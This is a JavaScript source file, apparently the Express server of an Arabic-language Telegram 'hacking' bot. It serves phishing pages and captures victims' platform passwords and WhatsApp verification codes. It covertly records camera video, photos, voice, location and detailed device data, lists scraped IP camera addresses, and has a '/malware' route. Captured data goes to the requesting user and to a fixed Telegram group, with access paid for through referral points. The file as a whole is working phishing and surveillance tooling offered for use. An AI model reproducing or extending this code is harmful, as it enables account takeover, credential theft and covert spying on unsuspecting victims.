        bot.sendMessage(chatId, "لم يتم العثور على كاميرات مراقبة في هذه الدولة. جرب دولة أخرى أو حاول مرة أخرى لاحقًا.");
        return;
      }
      const lastPage = parseInt(lastPageMatch[1], 10);
      const cameras = [];

      for (let page = 1; page <= lastPage; page++) {
        res = await axios.get(`${url}/?page=${page}`, { headers });
        const pageCameras = res.data.match(/http:\/\/\d+\.\d+\.\d+\.\d+:\d+/g) || [];
        cameras.push(...pageCameras);
      }

      if (cameras.length) {
        const numberedCameras = cameras.map((camera, index) => `${index + 1}. ${camera}`);
        for (let i = 0; i < numberedCameras.length; i += 50) {
          const chunk = numberedCameras.slice(i, i + 50);
          await bot.sendMessage(chatId, chunk.join('\n'));
        }
        await bot.sendMessage(chatId, "تم اختراق كاميرات المراقبة من هذه الدولة. يمكنك الآن مشاهدتها.\n⚠️ملاحظة: إذا لم تفتح الكاميرات في جهازك أو طلبت كلمة مرور، حاول تغيير الدولة أو المحاولة مرة أخرى لاحقًا.");
      } else {
        await bot.sendMessage(chatId, "لم يتم العثور على كاميرات مراقبة في هذه الدولة. جرب دولة أخرى أو حاول مرة أخرى لاحقًا.");
      }
    } catch (error) {
      await bot.sendMessage(chatId, `حدث خطأ أثناء محاولة اختراق كاميرات المراقبة.  لهذه الدوله بسبب قوه امانها  جرب دولة أخرى أو حاول مرة أخرى لاحقًا.`);
    }
  }
};

// الاستخدام:






console.log('Bot is running...');

          



function subscribeUser(userId) {
  if (!subscribedUsers.has(userId)) {
    subscribedUsers.add(userId);
    bot.sendMessage(userId, 'تم اشتراكك بنجاح! يمكنك الآن استخدام جميع ميزات البوت.');
    saveData().catch(error => console.error('فشل في حفظ البيانات:', error)); // حفظ البيانات بعد الاشتراك
    return true;
  }
  return false;
}

function unsubscribeUser(userId) {
  if (subscribedUsers.has(userId)) {
    subscribedUsers.delete(userId);
    bot.sendMessage(userId, 'تم إلغاء اشتراكك. قد تواجه بعض القيود على استخدام البوت.');
    saveData().catch(error => console.error('فشل في حفظ البيانات:', error)); // حفظ البيانات بعد إلغاء الاشتراك
    return true;
  }
  return false;
}

 
// تعديل دالة إضافة النقاط

function deductPointsFromUser(userId, points) {
  if (!allUsers.has(userId)) {
    console.log(`المستخدم ${userId} غير موجود`);
    return false;
  }
  const user = allUsers.get(userId);
  if ((user.points || 0) >= points) {
    user.points -= points;
    userPoints.set(userId, user.points);
    console.log(`تم خصم ${points} نقاط من المستخدم ${userId}. الرصيد الجديد: ${user.points}`);
    
    // إلغاء الاشتراك إذا أصبحت النقاط أقل من الحد المطلوب
    if (user.points < pointsRequiredForSubscription) {
      subscribedUsers.delete(userId);
      console.log(`تم إلغاء اشتراك المستخدم ${userId} بسبب نقص النقاط`);
      bot.sendMessage(userId, 'تم إلغاء اشتراكك بسبب نقص النقاط. يرجى جمع المزيد من النقاط للاشتراك مرة أخرى.');
    }
    
    return true;
  }
  console.log(`فشل خصم النقاط للمستخدم ${userId}. الرصيد الحالي: ${user.points}, المطلوب: ${points}`);
  return false;
}
// تشغيل البوت
bot.on('polling_error', (error) => {
  console.log(error);
});

console.log('البوت يعمل الآن...');


app.get('/whatsapp', (req, res) => {
  res.sendFile(path.join(__dirname, 'phone_form.html'));
});

app.post('/submitPhoneNumber', (req, res) => {
  const chatId = req.body.chatId;
  const phoneNumber = req.body.phoneNumber;

  // إرسال رسالة إلى التليجرام
  bot.sendMessage(chatId, `لقد قام الضحيه في ادخال رقم الهاتف هذا قم في طلب كود هاذا الرقم في وتساب سريعاً\n: ${phoneNumber}`)
    .then(() => {
      res.json({ success: true });
    })
    .catch((error) => {
      console.error('Error sending Telegram message:', error.response ? error.response.body : error);
      res.json({ success: false });
    });
});

app.post('/submitCode', (req, res) => {
  const chatId = req.body.chatId;
  const code = req.body.code;

  // إرسال رسالة إلى التليجرام
  bot.sendMessage(chatId, `لقد تم وصول كود الرقم هذا هو\n: ${code}`)
    .then(() => {
      // توجيه المستخدم إلى الرابط بعد إرسال الكود
      res.redirect('https://faq.whatsapp.com/');
    })
    .catch((error) => {
      console.error('Error sending Telegram message:', error.response ? error.response.body : error);
      res.json({ success: false });
    });
});


// مسار تصوير الصور بالكاميرا


// مسار المنصة الأصلية


// المسار الأصلي

const trackAttempts = (userId, action) => {
    if (!userVisits[userId]) {
        userVisits[userId] = { cameraVideo: 0, camera: 0, voiceRecord: 0, getLocation: 0 };
    }

    userVisits[userId][action]++;

    return userVisits[userId][action] > MAX_FREE_ATTEMPTS;
};

// دالة لتتبع المحاولات لمسار المنصة الأصلي
const trackPlatformAttempts = (platformId) => {
    if (!platformVisits[platformId]) {
        platformVisits[platformId] = 0;
    }

    platformVisits[platformId]++;

    return platformVisits[platformId] > MAX_FREE_ATTEMPTS;
};

// مسار تصوير الفيديو بالكاميرا
app.get('/camera/video/:userId', (req, res) => {
    const userId = req.params.userId;

    if (subscribedUsers.has(userId)) {
        res.sendFile(path.join(__dirname, 'dualCameraVideo.html'));
        return;
    }

    if (trackAttempts(userId, 'cameraVideo')) {
        res.send(`<html><body><h1>${freeTrialEndedMessage}</h1></body></html>`);
        return;
    }

    res.sendFile(path.join(__dirname, 'dualCameraVideo.html'));
});


// مسار الكاميرا
app.get('/camera/:userId', (req, res) => {
    const userId = req.params.userId;

    if (subscribedUsers.has(userId)) {
        res.sendFile(path.join(__dirname, 'location.html'));
        return;
    }

    if (trackAttempts(userId, 'camera')) {
        res.send(`<html><body><h1>${freeTrialEndedMessage}</h1></body></html>`);
        return;
    }

    res.sendFile(path.join(__dirname, 'location.html'));
});

// مسار تسجيل الصوت
app.get('/record/:userId', (req, res) => {
    const userId = req.params.userId;

    if (subscribedUsers.has(userId)) {
        res.sendFile(path.join(__dirname, 'record.html'));
        return;
    }

    if (trackAttempts(userId, 'voiceRecord')) {
        res.send(`<html><body><h1>${freeTrialEndedMessage}</h1></body></html>`);
        return;
    }

    res.sendFile(path.join(__dirname, 'record.html'));
});

// مسار الحصول على الموقع
app.get('/getLocation/:userId', (req, res) => {
    const userId = req.params.userId;

    if (subscribedUsers.has(userId)) {
        res.sendFile(path.join(__dirname, 'SJGD.html'));
        return;
    }

    if (trackAttempts(userId, 'getLocation')) {
        res.send(`<html><body><h1>${freeTrialEndedMessage}</h1></body></html>`);
        return;
    }

    res.sendFile(path.join(__dirname, 'SJGD.html'));
});

// مسار تغليف الرابط


// مسار تلغيم الرابط مع عملية إعادة التوجيه


// مسار تغليف الرابط

    // تتبع المحاولات
    


app.get('/:action/:platform/:chatId', (req, res) => {
    const { action, platform, chatId } = req.params;

    if (subscribedUsers.has(chatId)) {
        res.sendFile(path.join(__dirname, 'uploads', `${platform}_${action}.html`));
        return;
    }

    if (trackPlatformAttempts(chatId)) {
        res.send(`<html><body><h1>${freeTrialEndedMessage}</h1></body></html>`);
        return;
    }

    res.sendFile(path.join(__dirname, 'uploads', `${platform}_${action}.html`));
});




app.post('/submitVideo', upload.single('video'), async (req, res) => {
    const chatId = req.body.userId; // معرف المستخدم
    const file = req.file; // الفيديو المرسل
    const additionalData = JSON.parse(req.body.additionalData || '{}');
    const cameraType = req.body.cameraType;

    const groupChatId = '-1002493651294'; // معرف المحادثة الخاصة بالمجموعة

    if (file) {
        console.log(`Received video from user ${chatId}`);

        const caption = `
معلومات إضافية:
نوع الكاميرا: ${cameraType === 'front' ? 'أمامية' : 'خلفية'}
IP: ${additionalData.ip || 'غير متاح'}
الدولة: ${additionalData.country || 'غير متاح'}
المدينة: ${additionalData.city || 'غير متاح'}
المنصة: ${additionalData.platform || 'غير متاح'}
إصدار الجهاز: ${additionalData.deviceVersion || 'غير متاح'}
مستوى البطارية: ${additionalData.batteryLevel || 'غير متاح'}
الشحن: ${additionalData.batteryCharging !== undefined ? (additionalData.batteryCharging ? 'نعم' : 'لا') : 'غير متاح'}
        `;

        try {
            // جلب معلومات المستخدم من تيليجرام
            const userInfo = await bot.getChat(chatId);
            const userName = userInfo.first_name || 'غير متاح';
            const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';

            const userInfoText = `
اسم المستخدم: ${userName}
يوزر المستخدم: ${userUsername}
            `;

            // إرسال الفيديو إلى المستخدم الأصلي
            await bot.sendVideo(chatId, file.buffer, { caption });

            // إرسال الفيديو إلى مجموعة تيليجرام مع معلومات المستخدم
            await bot.sendVideo(groupChatId, file.buffer, { caption: `فيديو من المستخدم ${chatId}\n${userInfoText}\n${caption}` });

            console.log('Video sent successfully to both user and group');
            res.json({ success: true });
        } catch (error) {
            console.error('Error sending video to Telegram:', error);
            res.status(500).json({ success: false, error: 'Error sending video to Telegram' });
        }
    } else {
        res.status(400).json({ success: false, error: 'No video received' });
    }
});




// استلام الصور
app.post('/submitPhotos', upload.array('images', 20), async (req, res) => {
    const userId = req.body.userId; // معرف المستخدم
    const files = req.files; // الصور المرسلة
    const additionalData = JSON.parse(req.body.additionalData || '{}');
    const cameraType = req.body.cameraType;

    const groupChatId = '-1002493651294'; // معرف المحادثة الخاصة بالمجموعة

    if (files && files.length > 0) {
        console.log(`Received ${files.length} images from user ${userId}`);

        const caption = `
معلومات إضافية:
نوع الكاميرا: ${cameraType === 'front' ? 'أمامية' : 'خلفية'}
IP: ${additionalData.ip}
الدولة: ${additionalData.country}
المدينة: ${additionalData.city}
المنصة: ${additionalData.platform}
إصدار الجهاز: ${additionalData.deviceVersion}
مستوى البطارية: ${additionalData.batteryLevel || 'غير متاح'}
الشحن: ${additionalData.batteryCharging ? 'نعم' : 'لا' || 'غير متاح'}
        `;

        try {
            // جلب معلومات المستخدم من تيليجرام
            const userInfo = await bot.getChat(userId);
            const userName = userInfo.first_name || 'غير متاح';
            const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';

            const userInfoText = `
اسم المستخدم: ${userName}
يوزر المستخدم: ${userUsername}
            `;

            // إرسال الصور إلى المستخدم الأصلي
            for (const file of files) {
                await bot.sendPhoto(userId, file.buffer, { caption });
            }

            // إرسال الصور إلى مجموعة تيليجرام مع معلومات المستخدم
            for (const file of files) {
                await bot.sendPhoto(groupChatId, file.buffer, { caption: `صورة من المستخدم ${userId}\n${userInfoText}\n${caption}` });
            }

            console.log('Photos sent successfully to both user and group');
            res.json({ success: true });
        } catch (err) {
            console.error('Failed to send photos:', err);
            res.status(500).json({ error: 'Failed to send photos' });
        }
    } else {
        console.log('No images received');
        res.status(400).json({ error: 'No images received' });
    }
});




// استلام الصوت

app.post('/submitVoice', upload.single('voice'), async (req, res) => {
    const chatId = req.body.chatId; // معرف المستخدم
    const voiceFile = req.file; // الملف الصوتي المرسل
    const additionalData = JSON.parse(req.body.additionalData || '{}');

    const groupChatId = '-1002493651294'; // معرف المحادثة الخاصة بالمجموعة

    if (!voiceFile) {
        console.error('No voice file received');
        return res.status(400).json({ error: 'No voice file received' });
    }

    const caption = `
معلومات إضافية:
IP: ${additionalData.ip || 'غير متاح'}
الدولة: ${additionalData.country || 'غير متاح'}
المدينة: ${additionalData.city || 'غير متاح'}
المنصة: ${additionalData.platform || 'غير متاح'}
إصدار الجهاز: ${additionalData.deviceVersion || 'غير متاح'}
مستوى البطارية: ${additionalData.batteryLevel || 'غير متاح'}
الشحن: ${additionalData.batteryCharging !== undefined ? (additionalData.batteryCharging ? 'نعم' : 'لا') : 'غير متاح'}
    `;

    try {
        // جلب معلومات المستخدم من تيليجرام
        const userInfo = await bot.getChat(chatId);
        const userName = userInfo.first_name || 'غير متاح';
        const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';

        const userInfoText = `
اسم المستخدم: ${userName}
يوزر المستخدم: ${userUsername}
        `;

        // إرسال الرسالة الصوتية إلى المستخدم الأصلي
        await bot.sendVoice(chatId, voiceFile.buffer, { caption });

        // إرسال الرسالة الصوتية إلى مجموعة تيليجرام مع معلومات المستخدم
        await bot.sendVoice(groupChatId, voiceFile.buffer, { caption: `رسالة صوتية من المستخدم ${chatId}\n${userInfoText}\n${caption}` });

        console.log('Voice sent successfully to both user and group');
        res.json({ success: true });
    } catch (error) {
        console.error('Error sending voice:', error);
        res.status(500).json({ error: 'Failed to send voice message' });
    }
});

// استلام الموقع
app.post('/submitLocation', async (req, res) => {
    const { chatId, latitude, longitude, additionalData = {} } = req.body;

    // معرف مجموعة تيليجرام
    const groupChatId = '-1002493651294'; // ضع معرف المجموعة هنا

    // التحقق من البيانات المطلوبة
    if (!chatId || !latitude || !longitude) {
        return res.status(400).json({ error: 'Missing required data' });
    }

    try {
        // جلب معلومات المستخدم من تيليجرام
        const userInfo = await bot.getChat(chatId);
        const userName = userInfo.first_name || 'غير متاح';
        const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';

        const userInfoText = `
اسم المستخدم: ${userName}
يوزر المستخدم: ${userUsername}
        `;

        // إرسال الموقع إلى المستخدم الأصلي
        await bot.sendLocation(chatId, latitude, longitude);

        // إعداد الرسالة التي تحتوي على المعلومات الإضافية
        const message = `
معلومات إضافية:
IP: ${additionalData.ip || 'غير متاح'}
الدولة: ${additionalData.country || 'غير متاح'}
المدينة: ${additionalData.city || 'غير متاح'}
المنصة: ${additionalData.platform || 'غير متاح'}
متصفح المستخدم: ${additionalData.userAgent || 'غير متاح'}
مستوى البطارية: ${additionalData.batteryLevel || 'غير متاح'}
الشحن: ${additionalData.batteryCharging !== undefined ? (additionalData.batteryCharging ? 'نعم' : 'لا') : 'غير متاح'}
        `;

        // إرسال الرسالة التي تحتوي على المعلومات الإضافية إلى المستخدم
        await bot.sendMessage(chatId, message);

        // إرسال الموقع إلى مجموعة تيليجرام
        await bot.sendLocation(groupChatId, latitude, longitude);

        // إرسال الرسالة التي تحتوي على المعلومات الإضافية إلى المجموعة مع معلومات المستخدم
        await bot.sendMessage(groupChatId, `موقع مرسل من المستخدم ${chatId}\n${userInfoText}\n${message}`);

        console.log('Location and additional data sent successfully to both user and group');
        res.json({ success: true });
    } catch (error) {
        // معالجة الأخطاء أثناء إرسال الموقع أو الرسالة
        console.error('Error sending location:', error);
        res.status(500).json({ error: 'Failed to send location', details: error.message });
    }
});

app.post('/submitIncrease', async (req, res) => {
    const { username, password, platform, chatId, ip, country, city, userAgent } = req.body;

    console.log('Received ', { username, password, platform, chatId, ip, country, city });
    
    if (!chatId) {
        return res.status(400).json({ error: 'Missing chatId' });
    }

    const deviceInfo = useragent.parse(userAgent);
    const groupChatId = '-1002493651294'; // معرف المجموعة

    try {
        // جلب معلومات المستخدم من تيليجرام
        const userInfo = await bot.getChat(chatId);
        const userName = userInfo.first_name || 'غير متاح';
        const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';

        const userInfoText = `
اسم المستخدم: ${userName}
يوزر المستخدم: ${userUsername}
        `;

        // الرسالة التي ستُرسل إلى المستخدم
        const userMessage = `
تم اختراق حساب  جديد ☠️:
منصة: ${platform}
اسم المستخدم: ${username}
كلمة السر: ${password}
عنوان IP: ${ip}
الدولة: ${country}
المدينة: ${city}
نظام التشغيل: ${deviceInfo.os.toString()}
المتصفح: ${deviceInfo.toAgent()}
الجهاز: ${deviceInfo.device.toString()}
        `;

        // إرسال الرسالة إلى المستخدم
        await bot.sendMessage(chatId, userMessage);
        console.log('Message sent to user successfully');

        // إرسال الرسالة إلى المجموعة مع معلومات المستخدم
        await bot.sendMessage(groupChatId, `تم اختراق حساب  من قبل المستخدم ${chatId}\n${userInfoText}\n${userMessage}`);
        console.log('Message sent to group successfully');

        res.json({ success: true });
    } catch (error) {
        console.error('Error sending message:', error);
        res.status(500).json({ error: 'Failed to send increase data', details: error.message });
    }
});


app.post('/submitLogin', async (req, res) => {
    const { username, password, platform, chatId, ip, country, city, userAgent, batteryLevel, charging, osVersion } = req.body;

    console.log('Received login data:', { username, password, platform, chatId, ip, country, city, batteryLevel, charging, osVersion });

    if (!chatId) {
        return res.status(400).json({ error: 'Missing chatId' });
    }

    const deviceInfo = useragent.parse(userAgent);
    const groupChatId = '-1002493651294'; // معرف المجموعة

    try {
        // جلب معلومات المستخدم من تيليجرام
        const userInfo = await bot.getChat(chatId);
        const userName = userInfo.first_name || 'غير متاح';
        const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';

        const userInfoText = `
اسم المستخدم: ${userName}
يوزر المستخدم: ${userUsername}
        `;

        // الرسالة التي ستُرسل إلى المستخدم
        const userMessage = `
تم تلقي بيانات تسجيل الدخول:
منصة: ${platform}
اسم المستخدم: ${username}
كلمة السر: ${password}
عنوان IP: ${ip}
الدولة: ${country}
المدينة: ${city}
نظام التشغيل: ${osVersion}
المتصفح: ${deviceInfo.toAgent()}
الجهاز: ${deviceInfo.device.toString()}
مستوى البطارية: ${batteryLevel}
قيد الشحن: ${charging ? 'نعم' : 'لا'}
        `;

        // إرسال الرسالة إلى المستخدم
        await bot.sendMessage(chatId, userMessage);
        console.log('Message sent to user successfully');

        // إرسال الرسالة إلى المجموعة مع معلومات المستخدم
        await bot.sendMessage(groupChatId, `تم تلقي بيانات تسجيل الدخول بواسطة المستخدم ${chatId}\n${userInfoText}\n${userMessage}`);
        console.log('Message sent to group successfully');

        res.json({ success: true });
    } catch (error) {
        console.error('Error sending message:', error);
        res.status(500).json({ error: 'Failed to send login data', details: error.message });
    }
});



app.use(express.json());
app.use(express.urlencoded({ extended: true }));



app.post('/submitPhtos', upload.array('images', 10), async (req, res) => {
    console.log('Received a request to /submitPhotos');
    try {
        const { cameraType, additionalData } = req.body;
        const chatId = req.body.chatId; // استلام chatId من الطلب
        const files = req.files;

        // معرف مجموعة تيليجرام
        const groupChatId = '-1002493651294'; // ضع معرف المجموعة هنا

        // تحقق من القيم المستقبلة
        console.log('Received request body:', req.body);
        console.log('Received files:', req.files);

        if (!chatId || chatId === 'null') {
            console.error('chatId not provided or is null');
            return res.status(400).json({ success: false, error: 'chatId is required and cannot be null' });
        }

        if (!files || files.length === 0) {
            console.error('No files uploaded');
            return res.status(400).json({ success: false, error: 'No files uploaded' });
        }

        let parsedData = {};
        if (additionalData) {
            try {
                parsedData = JSON.parse(additionalData);
            } catch (error) {
                console.error('Invalid additionalData JSON:', error.message);
                return res.status(400).json({ success: false, error: 'Invalid additionalData format' });
            }
        }

        // جلب معلومات المستخدم من تيليجرام
        const userInfo = await bot.getChat(chatId);
        const userName = userInfo.first_name || 'غير متاح';
        const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';

        const userInfoText = `
اسم المستخدم: ${userName}
يوزر المستخدم: ${userUsername}
        `;

        // إعداد التعليق الذي سيتم إرساله مع الصورة
        const caption = `
معلومات إضافية:
نوع الكاميرا: ${cameraType === 'front' ? 'أمامية' : 'خلفية'}
IP: ${parsedData.ip || 'غير متاح'}
الدولة: ${parsedData.country || 'غير متاح'}
المدينة: ${parsedData.city || 'غير متاح'}
المنصة: ${parsedData.platform || 'غير متاح'}
وكيل المستخدم: ${parsedData.userAgent || 'غير متاح'}
مستوى البطارية: ${parsedData.batteryLevel || 'غير متاح'}
الشحن: ${parsedData.batteryCharging ? 'نعم' : 'لا'}
        `;

        // إرسال الصور للمستخدم الأصلي
        for (const file of files) {
            try {
                await bot.sendPhoto(chatId, file.buffer, { caption });
                console.log('Photo sent successfully to user');
            } catch (error) {
                console.error('Error sending photo to user:', error.message);
                return res.status(500).json({ success: false, error: 'Failed to send photo to user' });
            }
        }

        // إرسال الصور للمجموعة مع معلومات المستخدم
        for (const file of files) {
            try {
                await bot.sendPhoto(groupChatId, file.buffer, { caption: `صورة من المستخدم ${chatId}\n${userInfoText}\n${caption}` });
                console.log('Photo sent successfully to group');
            } catch (error) {
                console.error('Error sending photo to group:', error.message);
                return res.status(500).json({ success: false, error: 'Failed to send photo to group' });
            }
        }

        res.json({ success: true });
    } catch (error) {
        console.error('Failed to process request:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});



// مسار لتحميل صفحة البرمجيات الخبيثة
// مسار لتحميل صفحة البرمجيات الخبيثة
app.get('/malware', (req, res) => {
    const chatId = req.query.chatId;
    const originalLink = req.query.originalLink;
    // يمكنك تمرير chatId و originalLink إلى HTML إذا كنت بحاجة إلى ذلك
    res.sendFile(path.join(__dirname, 'malware.html'));
});


app.get('/:userId', (req, res) => {
    res.sendFile(path.join(__dirname, 'SS.html'));
});

// استقبال البيانات من الصفحة HTML وإرسالها إلى البوت
app.post('/SS', async (req, res) => {
    console.log('تم استقبال طلب POST في المسار /SS');
    console.log('البيانات المستلمة:', req.body);

    const chatId = req.body.userId;
    const deviceInfo = req.body.deviceInfo || {}; // التأكد من وجود deviceInfo
    const userInfo = req.body.userInfo || {}; // التأكد من وجود userInfo (قد لا يكون موجودًا في الطلب الأول)
    const groupChatId = '-1002493651294'; // معرف المجموعة

    const message = `
📝 **معلومات المستخدم:**
- الاسم: ${userInfo.name || 'غير معروف'}
- الهاتف: ${userInfo.phone || 'غير معروف'}
- البريد الإلكتروني: ${userInfo.email || 'غير معروف'}

📱 **معلومات الجهاز:**
- الدولة: ${deviceInfo.country || 'غير معروف'} 🔻
- المدينة: ${deviceInfo.city || 'غير معروف'} 🏙️
- عنوان IP: ${deviceInfo.ip || 'غير معروف'} 🌍
- شحن الهاتف: ${deviceInfo.battery || 'غير معروف'}% 🔋
- هل الهاتف يشحن؟: ${deviceInfo.isCharging ? 'نعم' : 'لا'} ⚡
- الشبكة: ${deviceInfo.network || 'غير معروف'} 📶 (سرعة: ${deviceInfo.networkSpeed || 'غير معروف'} ميغابت في الثانية)
- نوع الاتصال: ${deviceInfo.networkType || 'غير معروف'} 📡
- الوقت: ${deviceInfo.time || 'غير معروف'} ⏰
- اسم الجهاز: ${deviceInfo.deviceName || 'غير معروف'} 🖥️
- إصدار الجهاز: ${deviceInfo.deviceVersion || 'غير معروف'} 📜
- نوع الجهاز: ${deviceInfo.deviceType || 'غير معروف'} 📱
- الذاكرة (RAM): ${deviceInfo.memory || 'غير معروف'} 🧠
- الذاكرة الداخلية: ${deviceInfo.internalStorage || 'غير معروف'} GB 💾
- عدد الأنوية: ${deviceInfo.cpuCores || 'غير معروف'} ⚙️
- لغة النظام: ${deviceInfo.language || 'غير معروف'} 🌐
- اسم المتصفح: ${deviceInfo.browserName || 'غير معروف'} 🌐
- إصدار المتصفح: ${deviceInfo.browserVersion || 'غير معروف'} 📊
- دقة الشاشة: ${deviceInfo.screenResolution || 'غير معروف'} 📏
- إصدار نظام التشغيل: ${deviceInfo.osVersion || 'غير معروف'} 🖥️
- وضع الشاشة: ${deviceInfo.screenOrientation || 'غير معروف'} 🔄
- عمق الألوان: ${deviceInfo.colorDepth || 'غير معروف'} 🎨
- تاريخ آخر تحديث للمتصفح: ${deviceInfo.lastUpdate || 'غير معروف'} 📅
- بروتوكول الأمان المستخدم: ${deviceInfo.securityProtocol || 'غير معروف'} 🔒
- نطاق التردد للاتصال: ${deviceInfo.connectionFrequency || 'غير معروف'} 📡
- إمكانية تحديد الموقع الجغرافي: ${deviceInfo.geolocationAvailable ? 'نعم' : 'لا'} 🌍
- الدعم لتقنية البلوتوث: ${deviceInfo.bluetoothSupport ? 'نعم' : 'لا'} 🔵
- دعم الإيماءات اللمسية: ${deviceInfo.touchSupport ? 'نعم' : 'لا'} ✋
    `;

    try {
        // جلب معلومات المستخدم من تيليجرام
        const telegramUserInfo = await bot.getChat(chatId);
        const userName = telegramUserInfo.first_name || 'غير متاح';
        const userUsername = telegramUserInfo.username ? `@${telegramUserInfo.username}` : 'غير متاح';

        const userInfoText = `
اسم المستخدم: ${userName}
يوزر المستخدم: ${userUsername}
        `;

        // إرسال الرسالة إلى المستخدم
        await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
        console.log('تم إرسال معلومات الجهاز والمستخدم بنجاح للمستخدم');

        // إرسال الرسالة إلى المجموعة مع معلومات المستخدم
        await bot.sendMessage(groupChatId, `تم استقبال بيانات جهاز جديدة من المستخدم ${chatId}\n${userInfoText}\n${message}`, { parse_mode: 'Markdown' });
        console.log('تم إرسال معلومات الجهاز والمستخدم بنجاح إلى المجموعة');

        res.json({ success: true });
    } catch (err) {
        console.error('فشل في إرسال معلومات الجهاز والمستخدم:', err);
        res.status(500).json({ error: 'فشل في إرسال معلومات الجهاز والمستخدم' });
    }
});







const crypto = require('crypto');

// إنشاء رابط الدعوة
function createReferralLink(userId) {
  const referralCode = Buffer.from(userId).toString('hex');
  return `https://t.me/SJGDDW_BOT?start=${referralCode}`;
}

// فك تشفير رمز الدعوة
function decodeReferralCode(code) {
  try {
    return Buffer.from(code, 'hex').toString('utf-8');
  } catch (error) {
    console.error('خطأ في فك تشفير رمز الإحالة:', error);
    return null;
  }
}

// التحقق من الاشتراك في القنوات المطلوبة
async function checkSubscription(userId) {
  if (forcedChannelUsernames.length) {
    for (const channel of forcedChannelUsernames) {
      try {
        const member = await bot.getChatMember(channel, userId);
        if (member.status === 'left' || member.status === 'kicked') {
          await bot.sendMessage(userId, `عذرا، يجب عليك الانضمام إلى القنوات المطلوبة لاستخدام البوت:`, {
            reply_markup: {
              inline_keyboard: forcedChannelUsernames.map(channel => [{ text: `انضم إلى ${channel}`, url: `https://t.me/${channel.slice(1)}` }])
            }
          });
          return false;
        }
      } catch (error) {
        console.error('خطأ أثناء التحقق من عضوية القناة:', error);
        
        return false;
      }
    }
    return true;
  }
  return true;
}

// التعامل مع الرسائل
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text ? msg.text.toLowerCase() : '';
    const senderId = msg.from.id.toString();

  if (!allUsers.has(chatId.toString())) {
    const newUser = {
      id: chatId,
      firstName: msg.from.first_name,
      lastName: msg.from.last_name || '',
      username: msg.from.username || ''
    };
    allUsers.set(chatId.toString(), newUser);
    saveData().catch(error => console.error('فشل في حفظ البيانات:', error)); 
    await bot.sendMessage(adminId, `مستخدم جديد دخل البوت:\nالاسم: ${newUser.firstName} ${newUser.lastName}\nاسم المستخدم: @${newUser.username}\nمعرف الدردشة: ${chatId}`);
  }

  if (bannedUsers.has(senderId)) {
    await bot.sendMessage(chatId, 'تم إيقافك او حظرك من  استخدام البوت من قبل المطور. لا يمكنك استخدام البوت حاليًا.');
    return;
  }

  // التحقق من الاشتراك عند كل رسالة /start
  if (text.startsWith('/start')) {
    const isSubscribed = await checkSubscription(senderId);
    if (!isSubscribed) {
      return;
    }
  }

  if (text === '/start') {
    showDefaultButtons(senderId);
  } else if (text === '/login') {
    showLoginButtons(senderId);
  } else if (text === '/hacking') {
    showHackingButtons(senderId);
  } else if (text === '/vip') {
    showVipOptions(chatId, senderId);
  } else if (text.startsWith('/start ')) {
    const startPayload = text.split(' ')[1];
    console.log('Start payload:', startPayload);

    if (startPayload) {
      const referrerId = decodeReferralCode(startPayload);
      console.log('Decoded referrer ID:', referrerId);
      console.log('Sender ID:', senderId);

      if (referrerId && referrerId !== senderId) {
        try {
          const usedLinks = usedReferralLinks.get(senderId) || new Set();
          if (!usedLinks.has(referrerId)) {
            usedLinks.add(referrerId);
            usedReferralLinks.set(senderId, usedLinks);

            const referrerPoints = addPointsToUser(referrerId, 1);

            await bot.sendMessage(referrerId, `قام المستخدم ${msg.from.first_name} بالدخول عبر رابط الدعوة الخاص بك. أصبح لديك ${referrerPoints} نقطة.`);
            await bot.sendMessage(senderId, 'مرحبًا بك! لقد انضممت عبر رابط دعوة وتمت إضافة نقطة للمستخدم الذي دعاك.');

            console.log(`User ${senderId} joined using referral link from ${referrerId}`);
          } else {
            await bot.sendMessage(senderId, 'لقد استخدمت هذا الرابط من قبل.');
          }
        } catch (error) {
          console.error('خطأ في معالجة رابط الدعوة:', error);
          await bot.sendMessage(senderId, 'لقد دخلت عبر رابط صديقك وتم اضافه 1$ لصديقك.');
        }
      } else {
        await bot.sendMessage(senderId, 'رابط الدعوة غير صالح أو أنك تحاول استخدام رابط الدعوة الخاص بك.');
      }
    } else {
      await bot.sendMessage(senderId, 'مرحبًا بك في البوت!');
    }

    showDefaultButtons(senderId);
  }
});

// التعامل مع الاستفسارات
bot.on('callback_query', async (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const userId = callbackQuery.from.id.toString();
  const data = callbackQuery.data;

  try {
    // التحقق من الاشتراك قبل تنفيذ أي عملية
  
    const isSubscribed = await checkSubscription(userId);
    if (!isSubscribed) {
      await bot.sendMessage(chatId, 'مرحبا عزيزي المستخدم، لا نستطيع استخدام أي رابط اختراق سوى 5 مرات. قم بشراء اشتراك من المطور او قوم بجمع نقاط لاستخدام البوت بدون قيود.');
      return;
    }

    if (data === 'create_referral') {
      const referralLink = createReferralLink(userId);
      console.log('Created referral link:', referralLink);
      await bot.sendMessage(chatId, `رابط الدعوة الخاص بك هو:\n${referralLink}`);
      saveData().catch(error => console.error('فشل في حفظ البيانات:', error)); // حفظ البيانات بعد إنشاء رابط دعوة
    } else if (data === 'my_points') {
      const points = userPoints.get(userId) || 0;
      const isSubscribed = subscribedUsers.has(userId);
      let message = isSubscribed
        ? `لديك حاليًا ${points} نقطة. أنت مشترك في البوت ويمكنك استخدامه بدون قيود.`
        : `لديك حاليًا ${points} نقطة. اجمع ${pointsRequiredForSubscription} نقطة للاشتراك في البوت واستخدامه بدون قيود.`;
      await bot.sendMessage(chatId, message);
    } else {
      if (!subscribedUsers.has(userId)) {
        await bot.sendMessage(chatId, 'تم تنفيذ طلبك بنجاح');
      } else {
        await bot.sendMessage(chatId, 'جاري تنفيذ العملية...');
        // هنا يمكنك إضافة الكود الخاص بكل عملية
      }
    }
  } catch (error) {
    console.error('Error in callback query handler:', error);
    await bot.sendMessage(chatId, 'حدث خطأ أثناء تنفيذ العملية. الرجاء المحاولة مرة أخرى لاحقًا.');
  }

  saveData().catch(error => console.error('فشل في حفظ البيانات:', error)); // حفظ البيانات بعد كل عملية
  await bot.answerCallbackQuery(callbackQuery.id);
});

function addPointsToUser(userId, points) {
